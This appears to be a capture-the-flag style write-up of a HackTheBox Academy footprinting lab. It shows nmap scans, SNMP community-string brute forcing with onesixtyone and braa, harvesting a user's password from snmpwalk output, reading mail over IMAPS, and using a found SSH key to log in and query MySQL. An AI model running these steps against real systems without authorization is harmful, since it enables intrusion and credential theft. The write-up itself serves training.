# Footprinting Lab - Hard

[Footprinting Lab - Hard](https://academy.hackthebox.com/module/112/section/1080)  

>The target server is an MX and management server for the internal network. 
>This server has the function of a backup server for the internal accounts in the domain. 
>Accordingly, a user named `HTB` was also created here, whose credentials we need to access.  

## Enumeration  

>Service discovery  

```
sudo nmap -p 22,110,143,993,995 -sCV -A -O 10.129.19.122
```  

>NMAP Output:

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: UIDL USER RESP-CODES STLS TOP CAPA AUTH-RESP-CODE SASL(PLAIN) PIPELINING
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
143/tcp open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_imap-capabilities: more ENABLE AUTH=PLAINA0001 LOGIN-REFERRALS IDLE have ID Pre-login listed capabilities post-login STARTTLS LITERAL+ SASL-IR OK IMAP4rev1
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_imap-capabilities: ENABLE AUTH=PLAINA0001 LOGIN-REFERRALS IDLE more ID have Pre-login listed post-login capabilities LITERAL+ SASL-IR OK IMAP4rev1
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: CAPA AUTH-RESP-CODE SASL(PLAIN) USER RESP-CODES PIPELINING TOP UIDL
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
```  

### SNMP  

>Scan UDP ports and enumerate [SNMP service](https://academy.hackthebox.com/module/112/section/1075)  


```
sudo nmap -sU 10.129.19.122 -p 161 --script=snmp-brute -Pn --script-args snmp-brute.communitiesdb=/home/kali/Downloads/htb/academy/resources/snmpcommunities.txt
```  

![snmp Footprinting Lab Hard](/images/snmp-Footprinting-Lab-Hard.png)  

>Brute forcing the SNMP community string and Confirming that it is 'backup'.

```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.19.122
```  

>onesixtyone output results:  

```
10.129.19.122 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```  

>Footprinting the SNMP Service  

```
snmpwalk -c backup -v1 10.129.19.122
```  

![snmpwalk-Footprinting-Lab-Hard.png](/images/snmpwalk-Footprinting-Lab-Hard.png)  

>Discover the credentials for the user tom and the password `NMds732Js2761`.  

>Once we know a community string, we can use it with braa to brute-force the individual OIDs and enumerate the information behind them.  

```
sudo braa backup@10.129.19.122:.1.3.6.*
```  

## IMAP / POP3  

>Use the `Curl` command to perform Enumeration of the email services [IMAPS / POP3](https://academy.hackthebox.com/module/112/section/1073)  

```
curl -k 'imaps://10.129.19.122' --user tom:NMds732Js2761
```  

>Output confirm valid mail message items.

>Setup GUI `Evolution` Mail client to read emails in inbox.  

![evolution1-Footprinting-Lab-Hard][/images/evolution1-Footprinting-Lab-Hard.png)  

![evolution 2 Footprinting-Lab-Hard][/images/evolution2-Footprinting-Lab-Hard.png)  

![evolution 3 Footprinting Lab Hard][/images/evolution3-Footprinting-Lab-Hard.png)  

>Discover a SSH Key in the inbox of user `Tom` from `tech@inlanefreight.htb`  

![sshkey-in-mail-Footprinting-Lab-Hard](/images/sshkey-in-mail-Footprinting-Lab-Hard.png)  

## Privilege Escalation    

>Using obtained ssh key for tom to gain foothold.  

```
chmod 600 tom-key.txt
ssh tom@10.129.19.122 -i tom-key.txt
```  

>Identify permissions and group membership current user `tom`.

```
whoami
id
```  

### MySQL  

>Database enumeration with [mySQL](https://academy.hackthebox.com/module/112/section/1238)  
>Inside the ssh session as tom connect to the `mysql` service internallly.

```
mysql --user=tom -p
```  

>SQL Service enumeration to privilege escalate.  

```
show databases;
use users;
show tables;
select * from users where username like 'htb';
```  
